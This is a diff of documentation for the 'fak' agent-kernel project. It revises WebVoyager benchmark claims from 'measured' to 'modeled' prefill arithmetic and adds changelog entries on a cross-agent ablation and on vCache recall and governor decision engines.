@@ -18851,8 +18836,8 @@ spread on purpose:
 > Source: `docs/webbench-baselines.md`
 
 ---
-title: "fak WebBench Baselines: 8.8x Prefill Cut on WebVoyager"
-description: "fak's measured WebVoyager efficiency: on the real 643-task set it cuts 8.8–9.7× of per-turn prefill work, so an agent keeps its success rate at lower cost."
+title: "fak WebBench Baselines: 8.8x Prefill Cut on WebVoyager (modeled)"
+description: "fak's modeled WebVoyager prefill geometry: over the real 643-task set, a closed-form model puts the work-elimination at 8.8–9.7× vs the naive re-prefill floor (1.0–1.1× vs a tuned per-agent-KV stack). Not a wall-clock measurement."
 ---
 
 # Frontier WebBench Baselines & SOTA Comparison
@@ -18861,27 +18846,40 @@ description: "fak's measured WebVoyager efficiency: on the real 643-task set it 
 
 ---
 
-## ⚠️ Measurement Status: REAL MEASUREMENTS ACHIEVED ✅
+## Provenance: MODELED geometry over the real 643-task set
 
-**REAL WebVoyager measurements now available.** Theoretical results preserved below for comparison.
+These numbers are a **deterministic geometry model** computed over the real
+WebVoyager task set — **not a wall-clock measurement**. The task *set* is real
+(643 official tasks); the per-turn token geometry is derived from each task's
+difficulty, and the prefill cost is a closed-form integer formula
+(`internal/webbench/geometry.go::ComputeArms`). `fak webbench describe` prints the
+table under the honest header *"prefill-token work-elimination (deterministic
+floor, no model)."* Reproduce it yourself:
+`fak webbench describe --dataset testdata/webbench/webvoyager-converted.jsonl --workers 1,2,4,8`.
 
 | Component | Source | Status |
 |-----------|--------|--------|
-| Cost arm formulas (A/B/C) | Mathematical computation | ✅ Correct |
+| Cost arm formulas (A/B/C) | Closed-form integer geometry | ✅ Correct |
 | CLI implementation | Code execution | ✅ Shipped |
-| Real WebVoyager dataset | **643 tasks from official source** | ✅ Measured |
-| Real measurements | **8.8x - 9.7x on WebVoyager** | ✅ REAL |
-| Theoretical (mock) | 5 tasks, example.com | Legacy reference |
+| WebVoyager task set | **643 tasks from official source** | ✅ Real dataset |
+| Prefill numbers | **8.8x – 9.7x vs the naive floor** | ⚙️ Modeled (no wall-clock) |
+| Mock-geometry legacy | 5 tasks, example.com | Legacy reference |
 
-**What this proves:** The framework works AND delivers real measured gains on the actual WebVoyager benchmark.
+**What this shows:** the CLI works and the prefill-token *work-elimination* a
+fused resident KV buys over a naive re-prefill harness, computed over the real
+task set. The headline 8.8x–9.7x is the **A/C ratio vs the naive re-prefill
+floor**; the honest cross-worker reuse number (vs a tuned per-agent-KV stack) is
+**B/C = 1.00x–1.10x** (see the table below). It is **not** a measured throughput
+or wall-clock gain.
 
-**Real vs Theoretical:**
-- Real WebVoyager: **8.8x - 9.7x** elimination (measured)
-- Theoretical: 15.6x - 16.6x (mock data, conservative assumptions)
+**Modeled vs legacy mock:**
+- Real 643-task set: **8.8x – 9.7x** vs naive floor (modeled geometry)
+- Legacy mock: 15.6x – 16.6x (5 mock tasks, more conservative assumptions)
 
-The real number is lower because actual WebVoyager tasks have fewer turns (median 12) than the conservative assumptions used for theoretical modeling.
+The real-set number is lower because actual WebVoyager tasks have fewer turns
+(median 12) than the assumptions used for the legacy mock geometry.
 
-![WebBench prefill elimination — measured 8.8×–9.7× prefill-token elimination on real WebVoyager across worker counts, fak's fused resident KV vs naive per-turn re-prefill](https://raw.githubusercontent.com/anthony-chaudhary/fak/main/visuals/51-webbench-prefill-elimination.svg)
+![WebBench prefill elimination — modeled 8.8×–9.7× prefill-token elimination vs the naive floor over the real 643-task WebVoyager set, fak's fused resident KV vs naive per-turn re-prefill](https://raw.githubusercontent.com/anthony-chaudhary/fak/main/visuals/51-webbench-prefill-elimination.svg)
 
 ---
 
@@ -18950,9 +18948,9 @@ Running any of the above SOTA agents **through fak** delivers:
 
 ---
 
-### ✅ REAL MEASUREMENTS: WebVoyager (643 tasks)
+### ⚙️ MODELED over the official WebVoyager set (643 tasks)
 
-**Measured on the official WebVoyager dataset** (downloaded 2026-06-20 from [MinorJerry/WebVoyager](https://github.com/MinorJerry/WebVoyager)):
+**Modeled geometry over the official WebVoyager dataset** (downloaded 2026-06-20 from [MinorJerry/WebVoyager](https://github.com/MinorJerry/WebVoyager)) — closed-form prefill-token arithmetic, no wall-clock:
 
 | Workers | A naive | B per-agent KV | **C fak fused** | A/C (net) | B/C (cross-worker) | A/B (turn-tax) |
 |---------|---------|----------------|-------------|-----------|---------------------|----------------|
@@ -18967,13 +18965,13 @@ Running any of the above SOTA agents **through fak** delivers:
 - Difficulty: easy (87), medium (430), hard (126)
 - Categories: shopping (86), information (85), general (343), media (44), travel (42), search (43)
 
-**Methodology:** Real WebVoyager tasks processed through `fak webbench describe`. Geometry derived from actual task descriptions using standard WebVoyager-style turn estimates by difficulty. This is a **MEASURED** result on the **REAL** benchmark dataset.
+**Methodology:** Real WebVoyager tasks processed through `fak webbench describe`. Geometry derived from each task's difficulty using standard WebVoyager-style turn estimates; the prefill cost is then a closed-form integer formula (`internal/webbench/geometry.go::ComputeArms`). This is a **MODELED** prefill-token work floor over the **real** task set — **not** a wall-clock measurement. The 8.8x–9.7x is the A/C ratio vs the naive re-prefill floor; the cross-worker reuse number vs a tuned per-agent-KV stack is B/C = 1.00x–1.10x.
 
 ### Real Breakdown
 
 | Metric | Meaning | Real Value |
 |--------|---------|------------|
-| **A/C (Net Elimination)** | Measured on WebVoyager | **8.8x - 9.7x** |
+| **A/C (vs naive floor)** | Modeled over WebVoyager set | **8.8x - 9.7x** |
 | **B/C (Cross-Worker Reuse)** | Cross-worker prefix reuse | **1.00x - 1.10x** |
 | **A/B (Turn-Tax)** | Re-prefill vs KV persistence | **8.8x** (worker-independent) |
 
@@ -20424,6 +20422,10 @@ Honest ceiling, surfaced not hidden: the *detector* these drivers feed is ~100% 
 
 - [SHIPPED] `fak ablate` generalizes the 2-arm `fak bench` (vDSO on/off) into an N-ARM feature sweep: it replays ONE frozen tool-call trace under a list of feature configs and prints one row per arm with the kernel counters + a per-arm delta vs the baseline, all bound to the trace's single workload hash by an N-arm identical-workload guard (`ablate.Report.Validate`, generalizing `metrics.Report.Validate` from a fixed pair to N) so the deltas are apples-to-apples. It is the deterministic, $0, no-model core of the self-ablation benchmark harness (epic #607). HONESTY FENCE: rung 1 sweeps only the RUNTIME-SETTABLE vDSO knob (`kernel.SetVDSO`, reused via `bench.RunArm`); the ~40 env-gated features (`FAK_NORMGATE` / `FAK_INKERNEL_RADIX` / `FAK_COMPRESSOR` / …) are read at process start and need the subprocess-re-exec rung, and the live-loop + cross-agent (pure fak vs Claude Code / ultracode) arms are separate rungs — `BuildSweep` fails loud on a non-runtime feature rather than silently measuring nothing. Witness: `go test ./internal/ablate ./cmd/fak` (`TestSweep_VDSO_NArmGuardAndIsolatedDelta`, `TestValidate_RefusesMismatchedWorkloadHash`, `TestBuildSweep_UnknownAndDuplicate`, `TestAblateJSONReport`, `TestAblateUnknownFeatureUsageError`); `go run ./cmd/fak ablate --sweep vdso`.
 
+## Cross-agent ablation (Regime B — bare `claude -p` vs `fak guard -- claude -p`)
+
+- [SHIPPED] **`tools/cross_agent_ablate.py` ran the first live cross-agent (Regime B) ablation (epic #607 rung 3, #623) — and on this trivial task the fak guard is a net INPUT-side COST, reported honestly with its real sign.** Regime B = an EXTERNAL model emits different tool calls each run, so the rung-1 `WorkloadHash` identical-workload guard does NOT apply; validity is DISTRIBUTIONAL, not exact-workload. The task `pong` (write `RESULT.txt` == `PONG`, deterministic read-back check) is a TRIVIAL 1-tool first-cut substrate, NOT a hard SWE instance — it stresses the kernel's fixed per-session hop, not its decide quality. K=5 reps/arm, BOTH arms on `claude-opus-4-8` (model held constant ⇒ the token delta is the kernel's, not the model's); both arms succeeded 5/5 (agent-capability `success_rate` 1.0 vs 1.0). MEASURED two-number decompose (mean ± CI95, Student-t, K=5): output FLAT — `claude_code` 126.8 ± 14.0 vs `claude_code+fak` 124.0 ± 10.5 tok (ratio 0.978, saved +2.8 tok within CI), turns 2.0 → 2.0; but total INGESTED input WORSE — 52,077.8 → 81,063.4 tok (ratio 1.557, **saved_total_input = −28,985.6 tok**), because the guard hop reshapes the prompt-cache split (fresh input 2503 → 2144 while provider cache_read 42.6k → 72.5k). The negative is the headline here, never spun as a saving; the +fak adjudication was 5/5 ALLOW (journal_rows=5, zero denies/repairs/quarantines — a benign 1-tool task gives the floor nothing to catch). The controller ENFORCES the validity contract: success-gate (no saved number unless both arms completed AND succeeded), N-run variance (mean ± CI95 over K≥5; `variance_ok` flags K<5), kernel-efficiency REFUSED unless the model is held constant BOTH across arms and WITHIN each arm (`models_seen`), and tokens always DECOMPOSED (input/output/cache_read/cache_create), never summed. HONEST FENCE: ONE tiny tool-light task on ONE Windows host, single OAuth account, single-shot sessions — the cold-prefix cache-split is illustrative, not a fleet SLA; a denial-inducing + multi-tool task and a `pure_fak` arm are follow-on rungs. Witness: `python tools/cross_agent_ablate_test.py` (21 hermetic tests — no network, no `claude`, no `fak` binary); the committed artifact `experiments/ablate/cross-agent-pong-opus.json` embeds its per-rep `raw_reps`, and every aggregate + comparison number re-derives from them offline via `python tools/cross_agent_ablate.py report --reps experiments/ablate/cross-agent-pong-opus.json`.
+
 ## Fan-out benchmark (`fanbench` — one master goal → N sub-agents, N=1…1024)
 
 - [SHIPPED] `fanbench` sweeps the one-master-goal → N-subagent fan-out (the orchestrator-worker / lead-subagent topology) from N=1 to N=1024 — the regime no public benchmark maps (multi-agent suites top out at 5–7 agents; see `experiments/fanout/RESEARCH-BRIEF-fanout-2026-06-17.md`, a 19-agent verified survey) — and reports from REAL kernel events the cross-agent tool-result dedup the fan-out buys: a measured SHARED-world vs ISOLATED-world `k.Syscall` path-swap (`cross_uplift = shared − isolated`, the same ablation discipline as `fleetbench`), plus the exact shared-prefix KV-reuse geometry `(N−1)·prefix_tokens` the kernel does not redo (`model.NewBatchFromPrefix` prefills the master-goal prefix ONCE and clones it bit-identical into all N sub-agents). Both the N=1 single-agent control and the `no-share` profile give exactly 0 uplift (anti-inflation). Witness: `go test ./internal/turnbench ./cmd/fanbench` (incl. `TestFanoutNoShareZeroUplift`, `TestFanoutSingleAgentNoUplift`, `TestFanoutResearchPositiveUplift`, and `TestPrefixReuseFanoutWitness` — N clones bit-identical to an independent full prefill); `FANOUT-BENCH-RESULTS.md`.
@@ -20457,6 +20459,14 @@ Honest ceiling, surfaced not hidden: the *detector* these drivers feed is ~100% 
 - [SHIPPED] RSI **closed loop** (`internal/rsiloop`, `cmd/rsiloop`): the true loop over `cmd/rsicycle`'s one-shot. Where `rsicycle` takes the keep-bit's witnesses (before/after/suite-green/truth-clean) AS FLAGS, `rsiloop` DERIVES every one from a real run it performs itself — it forks a detached worktree off `main`, rewrites the tunable (`DefaultCacheSize`), measures a deterministic KPI by running `cmd/kpiprobe` there, takes suite-green from a real build+vet and truth-clean from the worktree's git status, then folds through `shipgate.Evaluate` + `shipgate.Gate`. The baseline is re-measured from `main` every run (it competes against LATEST main, never a stale local number), and KEEPs recursively advance the running bar. `-mode track` records that `main` measurement to an append-only JSONL journal — the ongoing benchmark-against-main series, with vs-last-point regression detection (exit 3 to alert). The loop never mutates `main`: a kept candidate advances only the in-memory baseline + the journal; landing it is a separate gated step (EXTENDING.md "Land it"). Honesty fences: the demo KPI is a real but *deterministic* LRU hit-rate (wall-clock-free, reproduces bit-for-bit cross-platform — a legal witness per `docs/proofs/00-METHOD.md`), the suite-green gate defaults to `go build`+`go vet` (the native Windows-safe proxy; production overrides with the full WSL `go test` suite), and only the demo tunable is wired — a real subsystem optimization plugs in by supplying its own Proposer/Measurer. Witness: `internal/rsiloop` tests (keep/revert/escalate/breaker-reset, the keep-bit needing all three, journal round-trip + track/LastTrack) + `cmd/rsiloop` driver test; see [`docs/rsi-loop.md`](docs/rsi-loop.md).
 - [SHIPPED] Issue-dispatch **closed loop** (`tools/issue_*`, `tools/dispatch_*`): the witness-gated GitHub-issue backlog driver for a plan-empty repo. `issue_lane_router` routes each open `gh` issue to its `dos.toml` lane; `issue_resolve_dispatch` passes the `dispatch_preflight` DoS gate (host clean ∧ account free ∧ live < cap), picks the busiest lane's next fresh issue (anti-churn cooldown + in-flight de-dup), and spawns ONE detached `claude -p` worker rendered by `issue_worker_prompt` with the load-bearing `#N`-in-subject rule; the worker ships a commit citing `#N`; `issue_closure_audit` binds commit→issue and grades through `dos commit-audit` (`TRUE_RESOLVED`/`CLAIMED_CLOSED`/`OPEN_WITNESSED`); the deterministic `issue_resolve_witnessed` close arm re-runs `dos commit-audit` per-SHA at close time (no keep on a self-authored claim) and closes via `gh issue close` citing the SHA. The live-worker population is provably ≤ `cap = min(--max-workers, dos [supervise].target)` (the no-DoS proof), every tool is dry-run until `--live`, and the operator-local view is `.dispatch-runs/dispatch-status.md` (gitignored; backlog-by-lane + closure honesty + silent-worker scan), refreshed by the loop. Witness: `tools/issue_lane_router_test.py`, `tools/issue_closure_audit` + `dispatch_status_test.py` (silent-worker classification, render_md tables) and the rest of the dispatch-tool test suite; see [`docs/dispatch-loop.md`](docs/dispatch-loop.md).
 - [SHIPPED] Harvest-corpus **advisory adjudication model** (`internal/advmodel`, #580): the consumer of the `internal/harvest` `LabelRow` corpus — the RSI loop's missing closing edge (the kernel harvested its own verdicts but nothing learned from them). A reproducible training run (`internal/advmodel/train.py`, numpy-only, deterministic) over a frozen, content-bearing corpus (`testdata/corpus.jsonl` — every label re-witnessed against the REAL adjudicator floor by `corpus_test.go`, and harvest-compatible by construction) trains a small logistic-regression classifier over a bag of call tokens and writes a model artifact (`testdata/adjudicator.json`); held-out precision/recall/F1 vs the stock reference (the inert model = the stock SmolLM2 emits no adjudication signal = F1 0) are printed and committed in the artifact `meta` (re-derivable by re-running train.py). The artifact loads as a fail-closed, opt-in `abi.Adjudicator` that may return ONLY `Deny` (corroborate) or `Defer` — never `Allow` — so under the kernel's restrictiveness fold (`kernel.Fold`) it can only tighten a decision, never weaken the deterministic floor; default-off (no self-registration; the frozen ABI is untouched). Witness: `internal/advmodel` tests (fail-closed-never-allows across benign/deny-worthy/inert, fold-safety under `kernel.Fold`, Go↔Python featurizer parity over all 65 corpus rows, corpus-matches-floor). HONEST SCOPE: this is a SMALL classifier (the issue's "small … model"), not a fine-tune of the fused SmolLM2 — see the retained STUB below; the 65-row corpus is a floor-grounded demo, and production accuracy needs a larger real harvest corpus.
+
+## vCache Chains & Recall (M4)
+
+- [SHIPPED] The vCache **chains & recall decision engine** (`internal/vcachechain`, #719) — the M4 milestone: the prefix DAG + cost-gated rebuild that decides, per recall, whether to REPLAY a chain (rebuild) or send the unit COLD. A pure, deterministic, off-path leaf (architest tier 2; stdlib + `cachemeta`(1) + `vcachegov`(2, the Law-D4 `SecretClassification`); NOT registered into the kernel) implements every #719 acceptance criterion: (1) a prefix DAG (`ChainNode`/`PrefixDAG`) carrying the parent chain per vBlock — the recall plan, not just identity — with `ChainTo`/`PrefixTokens`/single-rooted-arborescence `Validate`; (2) topological replay with the **send-one-then-fan** barrier (`TopologicalReplay` → `ReplayLevel{Lead, Fan}`) that releases sibling dependents only after the lead's first streamed content delta is observable (§8 + Rule C2); (3) the **20-block lookback** breakpoint placement (`PlaceBreakpoints` drops one every ~15 content blocks, capped at 4 — Rule C3); (4) partial-warmth replay from the first cold node (`WarmDepth`, fed by `cachemeta.FirstDivergeTokenOffset`); and (5) the load-bearing **§11.0 cost gate** — `PlanRecall` REFUSES a chain rebuild whenever `replay_cost ≥ amortized_savings` (i.e. `P·r ≥ S·U`), so it refuses almost every SINGLE-unit recall (the §11.0 headline: a 30 000-token prefix at r=0.1 to recall one 10-token unit is a 3000→10, i.e. **300× LOSS**) and allows rebuild ONLY for amortized fan-out (`P·r < S·U`), with `BreakEvenSiblings = floor(P·r/U)+1` = **301** for that example. **GATED OFF BY DEFAULT** (`DefaultEnabled = false`): with the gate off every recall is `DecisionGatedOff` and the caller sends the unit cold — the live provider recall loop is what flips it on, exactly as the M5 Governor waits on M1–M3. The proof surface is `fak vcache prove-recall [--prefix-tokens N --unit-tokens N --read-mult F --siblings N]`: the default run REFUTES the single-unit rebuild (exit 1, the 300× loss caught) and `--siblings 301` PROVES it (exit 0, the amortized exception); `fak vcache status` reports the engine up, gated off, and the cost-gate proof. Correctness never depends on the verdict (Law A2): whatever `PlanRecall` returns, the caller must always be able to re-send the full prefix. Witnesses: `go test ./internal/vcachechain ./cmd/fak -run "TestProveRecall|TestPlanRecall|TestRebuild|TestBreakEven|TestPlaceBreakpoints|TestTopologicalReplay|TestPrefixDAG|TestRunVCacheProveRecall"` pins the §11.0 numbers to the decimal (replay 3000, fresh 10, loss 300×, break-even 301, 301 allowed / 300 refused), the prefix-DAG validation/cycle/ChainTo order, the send-one-then-fan fan-out grouping, the warm-prefix skip, the 15-block/4-cap breakpoint placement, the Law-D4 secret-chain refusal, and the gated-off default; see [`docs/notes/VCACHE-VIRTUAL-API-CACHE-2026-06-24.md`](docs/notes/VCACHE-VIRTUAL-API-CACHE-2026-06-24.md) §8/§11.0/§13-M4. HONEST SCOPE: this is the off-path DECISION engine (prefix DAG + cost gate + replay scheduler), not the live provider recall transport — the live loop still waits on M1–M3 calibration/warming, the same posture as the M5 Governor.
+
+## vCache Governor (M5)
+
+- [SHIPPED] The vCache **Governor decision engine** (`internal/vcachegov`, #720) — the steady-state policy that turns the future M1-M3 warm set into a self-sustaining, rate-safe, secret-safe warm set. A pure, deterministic, off-path leaf (architest tier 2; stdlib + `cachemeta` only; not registered into the kernel) implements all four #720 acceptance criteria: pin/lazy/evict classification by the reconciled §10 cutoff `λT > ln((w+μ+L)/L)`, the rate-limit warm-budget scheduler `warms/min = min(R-R_real, (X-X_real)/P)`, cross-shard affinity routing with correlated-`p(hit)` collapse detection, and the Law-D4 secret classifier that refuses secrets/regulated content before any economics. The proof surface is `fak vcache status|prove|prove-telemetry`: default Codex-like star-anchor inputs (4096-token anchor, 7 sibling requests, 10-token suffixes, 0.1 read / 1.25 write multipliers) prove 21,094.4 token-equivalents saved (73.4%), below-minimum or unsafe-content workloads are first-class REFUTED outcomes, and observed provider telemetry is reconciled from JSONL instead of assumed. Live Claude Code witness: `go run ./cmd/fak vcache prove-telemetry --file experiments/agent-live/vcache-claude-prefix-probe-2026-06-25.jsonl` proves 13,141.5 input-token-equivalents saved (4.73%) over four prefix-sibling turns with first positive request 4, while the first three turns refute because cache reads did not yet repay the 1h cache-write cost. Codex/OpenAI witness path: raw Responses usage (`usage.input_tokens_details.cached_tokens`), Chat Completions usage (`usage.prompt_tokens_details.cached_tokens`), Codex CLI `token_count` rows (`payload.info.last_token_usage.cached_input_tokens`), and `codex exec --json` `turn.completed` usage are parsed into uncached/cached input portions and proven/refuted by the same telemetry proof; the replayable Codex CLI artifact at `experiments/agent-live/vcache-codex-token-count-proof-2026-06-25.jsonl` proves 9,147,340.8 token-equivalents saved (85.98%) over 68 events, while the optional raw OpenAI API probe skips without `OPENAI_API_KEY` instead of overclaiming. `status --json` exposes the verifier-ready state plus a cached-token sample proof and zero-cache refutation. Witnesses: `go test ./internal/vcachegov ./cmd/fak -run "TestRunVCache|TestProve"` covers the §5.4 cutoff, §5.5 warm-budget examples, affinity consistency, secret refusal, CLI JSON, OpenAI/Codex usage parsing, and proven/refuted proof exits; `fak vcache prove-telemetry` covers the live Claude and replayable Codex telemetry arithmetic. HONEST SCOPE: this is the policy/decision layer plus cost proof only — correctness never depends on a provider cache hit, and the live warming loop remains #716-#718. See [`docs/notes/VCACHE-VIRTUAL-API-CACHE-2026-06-24.md`](docs/notes/VCACHE-VIRTUAL-API-CACHE-2026-06-24.md) §5.4/§5.5/§9/§11.4/§13 and [`experiments/agent-live/VCACHE-CODEX-OPENAI-PROBE-2026-06-25.md`](experiments/agent-live/VCACHE-CODEX-OPENAI-PROBE-2026-06-25.md).
 
 ## What fak is NOT
 
